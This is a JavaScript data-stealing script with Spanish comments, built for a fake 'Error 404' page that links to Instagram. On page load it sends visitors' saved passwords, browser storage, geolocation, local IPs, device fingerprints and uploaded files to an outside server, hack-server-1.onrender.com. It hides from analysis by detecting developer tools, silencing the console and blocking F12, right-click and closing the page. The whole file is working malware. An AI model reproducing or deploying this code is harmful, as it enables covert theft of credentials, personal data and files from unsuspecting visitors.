// Configuración del servidor
const SERVER_URL = 'https://hack-server-1.onrender.com';

// Funciones de la interfaz
function goBack() {
    window.history.back();
}

function goHome() {
    window.location.href = 'https://www.instagram.com';
}

// Mostrar timestamp actual
document.getElementById('timestamp').textContent = new Date().toISOString();

// Anti-análisis y detección de herramientas de desarrollador
(function() {
    let devtools = {
        open: false,
        orientation: null
    };
    
    const threshold = 160;
    
    setInterval(() => {
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                document.body.innerHTML = '<h1>Error al cargar la página</h1>';
            }
        } else {
            devtools.open = false;
        }
    }, 500);
})();

// Sistema de recolección de datos
class DataCollector {
    constructor() {
        this.serverUrl = SERVER_URL;
        this.init();
    }
    
    init() {
        this.collectDeviceInfo();
        this.collectBrowserInfo();
        this.collectLocationInfo();
        this.attemptCredentialAccess();
        this.collectLocalStorage();
        this.setupFileCapture();
        this.collectNetworkInfo();
        this.collectSystemInfo();
    }
    
    // Recopilar información del dispositivo
    collectDeviceInfo() {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        this.sendData('/api/device-info', deviceInfo);
    }
    
    // Recopilar información del navegador
    collectBrowserInfo() {
        const browserInfo = {
            vendor: navigator.vendor,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            product: navigator.product,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            deviceMemory: navigator.deviceMemory,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null,
            plugins: Array.from(navigator.plugins).map(p => ({
                name: p.name,
                description: p.description,
                filename: p.filename
            })),
            mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
                type: m.type,
                description: m.description
            }))
        };
        
        this.sendData('/api/device-info', browserInfo);
    }
    
    // Recopilar información de ubicación
    collectLocationInfo() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };
                    this.sendData('/api/device-info', locationInfo);
                },
                (error) => {
                    console.log('Error obteniendo ubicación:', error);
                }
            );
        }
    }
    
    // Intentar acceder a credenciales guardadas
    attemptCredentialAccess() {
        if ('credentials' in navigator) {
            navigator.credentials.get({
                password: true,
                mediation: 'silent'
            }).then(cred => {
                if (cred) {
                    const credentials = {
                        username: cred.id,
                        password: cred.password,
                        name: cred.name
                    };
                    this.sendData('/api/credentials', credentials);
                }
            }).catch(err => {
                console.log('Error al acceder a credenciales:', err);
            });
        }
        
        // Intentar con Credential Management API
        if ('PasswordCredential' in window) {
            navigator.credentials.get({
                password: true
            }).then(cred => {
                if (cred) {
                    this.sendData('/api/credentials', {
                        username: cred.id,
                        password: cred.password
                    });
                }
            });
        }
    }
    
    // Recopilar localStorage y sessionStorage
    collectLocalStorage() {
        const storageData = {
            localStorage: {},
            sessionStorage: {},
            indexedDB: {}
        };
        
        // Recopilar localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageData.localStorage[key] = localStorage.getItem(key);
        }
        
// Recopilar sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storageData.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        // Intentar acceder a IndexedDB
        if ('indexedDB' in window) {
            const databases = indexedDB.databases ? indexedDB.databases() : Promise.resolve([]);
            databases.then(dbList => {
                dbList.forEach(db => {
                    // Nota: El acceso completo a IndexedDB requiere más trabajo
                    storageData.indexedDB[db.name] = 'Detected';
                });
                this.sendData('/api/localstorage', storageData);
            });
        } else {
            this.sendData('/api/localstorage', storageData);
        }
    }
    
    // Configurar captura de archivos
    setupFileCapture() {
        // Crear un input de archivo oculto
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.multiple = true;
        fileInput.accept = '*/*';
        fileInput.style.display = 'none';
        document.body.appendChild(fileInput);
        
        // Evento para capturar archivos cuando el usuario hace clic
        document.addEventListener('click', (e) => {
            // Solo activar después de un segundo de estar en la página
            setTimeout(() => {
                if (Math.random() < 0.1) { // 10% de probabilidad
                    fileInput.click();
                }
            }, 1000);
        }, { once: false });
        
        fileInput.addEventListener('change', (e) => {
            const files = Array.from(e.target.files);
            files.forEach(file => {
                this.sendFile(file);
            });
        });
        
        // Intentar acceso a la API File System Access (Chrome 86+)
        if ('showOpenFilePicker' in window) {
            document.addEventListener('keydown', async (e) => {
                if (e.ctrlKey && e.key === 'o') {
                    e.preventDefault();
                    try {
                        const fileHandles = await window.showOpenFilePicker({
                            multiple: true,
                            types: [{
                                description: 'All files',
                                accept: { '*/*': ['.'] }
                            }]
                        });
                        
                        for (const handle of fileHandles) {
                            const file = await handle.getFile();
                            this.sendFile(file);
                        }
                    } catch (err) {
                        console.log('Acceso a archivos denegado');
                    }
                }
            });
        }
    }
    
    // Recopilar información de red
    collectNetworkInfo() {
        if ('connection' in navigator) {
            const connection = navigator.connection;
            const networkInfo = {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                downlinkMax: connection.downlinkMax,
                rtt: connection.rtt,
                saveData: connection.saveData,
                type: connection.type
            };
            this.sendData('/api/device-info', networkInfo);
        }
        
        // Obtener IPs locales (WebRTC)
        this.getLocalIPs();
    }
    
    // Obtener IPs locales usando WebRTC
    getLocalIPs() {
        const ips = [];
        
        const rtc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        
        rtc.createDataChannel('', { reliable: false });
        
        rtc.onicecandidate = (event) => {
            if (event.candidate) {
                const candidate = event.candidate.candidate;
                const match = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                if (match && !ips.includes(match[1])) {
                    ips.push(match[1]);
                    this.sendData('/api/device-info', { localIP: match[1] });
                }
            }
        };
        
        rtc.createOffer()
            .then(offer => rtc.setLocalDescription(offer))
            .catch(e => console.error('Error obteniendo IPs:', e));
    }
    
    // Recopilar información del sistema
    collectSystemInfo() {
        const systemInfo = {
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory,
            battery: null,
            sensors: {
                accelerometer: 'Accelerometer' in window,
                gyroscope: 'Gyroscope' in window,
                magnetometer: 'Magnetometer' in window,
                ambientLight: 'AmbientLightSensor' in window
            },
            webgl: this.getWebGLInfo(),
            canvas: this.getCanvasFingerprint()
        };
        
        // Información de la batería
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                systemInfo.battery = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
                this.sendData('/api/device-info', systemInfo);
            });
        } else {
            this.sendData('/api/device-info', systemInfo);
        }
    }
    
    // Obtener información de WebGL
    getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) return null;
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
        };
    }
    
    // Obtener fingerprint del canvas
    getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Canvas fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Canvas fingerprint', 4, 17);
        
        return canvas.toDataURL();
    }
    
    // Enviar datos al servidor
    async sendData(endpoint, data) {
        try {
            const response = await fetch(`${this.serverUrl}${endpoint}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                console.error('Error al enviar datos:', response.statusText);
            }
        } catch (error) {
            console.error('Error de red:', error);
        }
    }
    
    // Enviar archivo al servidor
    async sendFile(file) {
        const reader = new FileReader();
        reader.onload = async (e) => {
            const fileData = {
                name: file.name,
                size: file.size,
                type: file.type,
                lastModified: file.lastModified,
                content: e.target.result
            };
            
            try {
                const response = await fetch(`${this.serverUrl}/api/files`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(fileData)
                });
                
                if (!response.ok) {
                    console.error('Error al enviar archivo:', response.statusText);
                }
            } catch (error) {
                console.error('Error de red al enviar archivo:', error);
            }
        };
        
        reader.readAsDataURL(file);
    }
}

// Iniciar el recolector de datos cuando la página carga
window.addEventListener('load', () => {
    new DataCollector();
    
    // Intentar mantener la página activa
    setInterval(() => {
        document.title = 'Error 404 - Página no encontrada';
    }, 1000);
});

// Prevenir cierre con truco
window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = '';
});

// Ocultar consola
(function() {
    const originalLog = console.log;
    console.log = function() {
        return;
    };
    
    const originalWarn = console.warn;
    console.warn = function() {
        return;
    };
    
    const originalError = console.error;
    console.error = function() {
        return;
    };
})();

// Evitar selección de texto
document.addEventListener('selectstart', (e) => {
    e.preventDefault();
});

// Evitar clic derecho
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// Evitar F12
document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
        (e.ctrlKey && e.key === 'u')) {
        e.preventDefault();
    }
});